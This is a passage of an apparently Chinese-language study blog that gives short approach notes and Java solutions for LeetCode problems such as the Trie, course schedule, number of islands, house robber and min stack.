<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">动态规划。定义dp[i][j]为以该方格为右下角的最大面积正方形。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximalSquare</span><span class="params">(<span class="type">char</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i == <span class="number">0</span> || j == <span class="number">0</span>) dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        dp[i][j] = Integer.min(Integer.min(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]), dp[i - <span class="number">1</span>][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    res = Integer.max(res, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res * res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><p>小根堆</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span>(priorityQueue.size() &lt; k) priorityQueue.add(num);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(num &gt; priorityQueue.peek())&#123;</span><br><span class="line">                    priorityQueue.poll();</span><br><span class="line">                    priorityQueue.add(num);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> priorityQueue.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/solutions/2361969/215-shu-zu-zhong-de-di-k-ge-zui-da-yuan-d786p/">215. 数组中的第K个最大元素 - 力扣（LeetCode）</a></p>
<p>基于快速排序的选择方法</p>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int findKthLargest(int[] nums, int k) &#123;</span><br><span class="line">        List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            list.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        return selectKthLargest(list, k);</span><br><span class="line">    &#125;</span><br><span class="line">    public int selectKthLargest(List&lt;Integer&gt; list, int k)&#123;</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        int pivot =  list.get(random.nextInt(list.size()));</span><br><span class="line">        List&lt;Integer&gt; low = new ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; high = new ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; mid = new ArrayList&lt;&gt;();</span><br><span class="line">        for (Integer num : list) &#123;</span><br><span class="line">            if(num &gt; pivot) high.add(num);</span><br><span class="line">            else if(num &lt; pivot) low.add(num);</span><br><span class="line">            else mid.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        if(high.size() &gt;= k) return selectKthLargest(high, k);</span><br><span class="line">        if(high.size() + mid.size() &gt;= k) return pivot;</span><br><span class="line">        return selectKthLargest(low, k - high.size() - mid.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="208-实现-Trie-前缀树-力扣（LeetCode）"><a href="#208-实现-Trie-前缀树-力扣（LeetCode）" class="headerlink" title="208. 实现 Trie (前缀树) - 力扣（LeetCode）"></a><a href="https://leetcode.cn/problems/implement-trie-prefix-tree/description/?envType=problem-list-v2&envId=2cktkvj">208. 实现 Trie (前缀树) - 力扣（LeetCode）</a></h3><p>思路，模板题</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Trie</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> isValid;</span><br><span class="line">    Trie[] next; </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Trie</span><span class="params">()</span> &#123;</span><br><span class="line">        next = <span class="keyword">new</span> <span class="title class_">Trie</span>[<span class="number">26</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        <span class="type">Trie</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> word.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.next[word.charAt(i) - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Trie</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Trie</span>();</span><br><span class="line">                cur.next[word.charAt(i) - <span class="string">&#x27;a&#x27;</span>] = child;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next[word.charAt(i) - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        cur.isValid = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">search</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word.length();</span><br><span class="line">        <span class="type">Trie</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.next[word.charAt(i) - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next[word.charAt(i) - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.isValid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">startsWith</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> prefix.length();</span><br><span class="line">        <span class="type">Trie</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.next[prefix.charAt(i) - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next[prefix.charAt(i) - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your Trie object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * Trie obj = new Trie();</span></span><br><span class="line"><span class="comment"> * obj.insert(word);</span></span><br><span class="line"><span class="comment"> * boolean param_2 = obj.search(word);</span></span><br><span class="line"><span class="comment"> * boolean param_3 = obj.startsWith(prefix);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="207-课程表"><a href="#207-课程表" class="headerlink" title="207. 课程表"></a><a href="https://leetcode.cn/problems/course-schedule/">207. 课程表</a></h3><p>思路</p>
<p>拓扑排序</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canFinish</span><span class="params">(<span class="type">int</span> numCourses, <span class="type">int</span>[][] prerequisites)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] inDegree = <span class="keyword">new</span> <span class="title class_">int</span>[numCourses];</span><br><span class="line">        List&lt;Integer&gt;[] list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[numCourses];</span><br><span class="line"><span class="comment">//        Arrays.fill(list, new ArrayList&lt;&gt;());</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numCourses; i++) &#123;</span><br><span class="line">            list[i] = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] prerequisite : prerequisites) &#123;</span><br><span class="line">            inDegree[prerequisite[<span class="number">0</span>]]++;</span><br><span class="line">            list[prerequisite[<span class="number">1</span>]].add(prerequisite[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numCourses; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(inDegree[i] == <span class="number">0</span>)&#123;</span><br><span class="line">                queue.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty())&#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">curCourse</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">for</span> (Integer i : list[curCourse]) &#123;</span><br><span class="line">                inDegree[i]--;</span><br><span class="line">                <span class="keyword">if</span>(inDegree[i] == <span class="number">0</span>) queue.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count == numCourses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表</a></h3><p>思路：递归反转即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">curNext</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = curNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200. 岛屿数量"></a><a href="https://leetcode.cn/problems/number-of-islands/">200. 岛屿数量</a></h3><p>思路：bfs或dfs即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DIRECTION_COUNT</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numIslands</span><span class="params">(<span class="type">char</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n]; </span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!visited[i][j] &amp;&amp; grid[i][j] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    res ++;</span><br><span class="line">                    dfs(i, j, m, n, grid, visited);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">char</span>[][] grid, <span class="type">boolean</span>[][] visited)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || grid[i][j] == <span class="string">&#x27;0&#x27;</span> || visited[i][j]) <span class="keyword">return</span>;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; DIRECTION_COUNT; k++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newI</span> <span class="operator">=</span> i + dx[k];</span><br><span class="line">            <span class="type">int</span> <span class="variable">newJ</span> <span class="operator">=</span> j + dy[k];</span><br><span class="line">            dfs(newI, newJ, m, n, grid, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198. 打家劫舍"></a><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">动态规划。定义dp[j]为抢劫了j的赚得最多的钱，那么有</span><br><span class="line">dp[j] = dp[i] + nums[j] 0 &lt;= i &lt;= j - 2</span><br><span class="line">又一定有</span><br><span class="line">dp[j] &gt;= dp[j - 2] </span><br><span class="line">因此dp[j] = max(dp[j - 2], dp[j - 3])。</span><br><span class="line">可以看到只跟四个状态有关，可以空间压缩实际上</span><br><span class="line">最后结果</span><br><span class="line">res = max(dp[m - 1], dp[m - 2])</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x2</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">x3</span> <span class="operator">=</span> nums[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newX3</span> <span class="operator">=</span> Integer.max(x1, x2) + nums[i];</span><br><span class="line">            x1 = x2;</span><br><span class="line">            x2 = x3;</span><br><span class="line">            x3 = newX3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.max(x2, x3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp[j] = max(dp[j-1], dp[j-2] + num[j])</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[length];</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = Math.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; length; i++) &#123;</span><br><span class="line">            dp[i] = Math.max(dp[i - <span class="number">2</span>] + nums[i], dp[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[length - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="169-多数元素"><a href="#169-多数元素" class="headerlink" title="169. 多数元素"></a><a href="https://leetcode.cn/problems/majority-element/">169. 多数元素</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Boyer-Moore 投票算法</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == res)&#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="keyword">if</span>(count == -<span class="number">1</span>)&#123;</span><br><span class="line">                    res = nums[i];</span><br><span class="line">                    count = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238. 除自身以外数组的乘积"></a><a href="https://leetcode.cn/problems/product-of-array-except-self/">238. 除自身以外数组的乘积</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录两边乘积即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] productExceptSelf(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] rightMul = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        rightMul[n] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">            rightMul[i] = rightMul[i + <span class="number">1</span>] * nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftMul</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] = leftMul * rightMul[i + <span class="number">1</span>];</span><br><span class="line">            leftMul *= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优化思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一：可以将res和rightMul用一个数组。</span><br><span class="line">二：可以一次遍历。同时维护左右成绩</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] productExceptSelf(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(res, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] *= left;</span><br><span class="line">            res[n - i - <span class="number">1</span>] *= right;</span><br><span class="line">            left *= nums[i];</span><br><span class="line">            right *= nums[n -i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title="155. 最小栈"></a><a href="https://leetcode.cn/problems/min-stack/">155. 最小栈</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用一个辅助栈即可，用不上单调栈</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Integer&gt; stack;</span><br><span class="line">    Stack&lt;Integer&gt; minStack;<span class="comment">//单调栈</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MinStack</span><span class="params">()</span> &#123;</span><br><span class="line">        stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        minStack =<span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        minStack.push(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        stack.push(val);</span><br><span class="line">        minStack.push(Integer.min(val, minStack.peek()));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        stack.pop();</span><br><span class="line">        minStack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj.push(val);</span></span><br><span class="line"><span class="comment"> * obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj.getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="152-乘积最大子数组"><a href="#152-乘积最大子数组" class="headerlink" title="152. 乘积最大子数组"></a><a href="https://leetcode.cn/problems/maximum-product-subarray/">152. 乘积最大子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字有正数和复数，因为需要维护最大正数值和最小复数值。可以dp，然后发现能空间压缩，只需要两个变量</span><br></pre></td></tr></table></figure>

<p>代码</p>
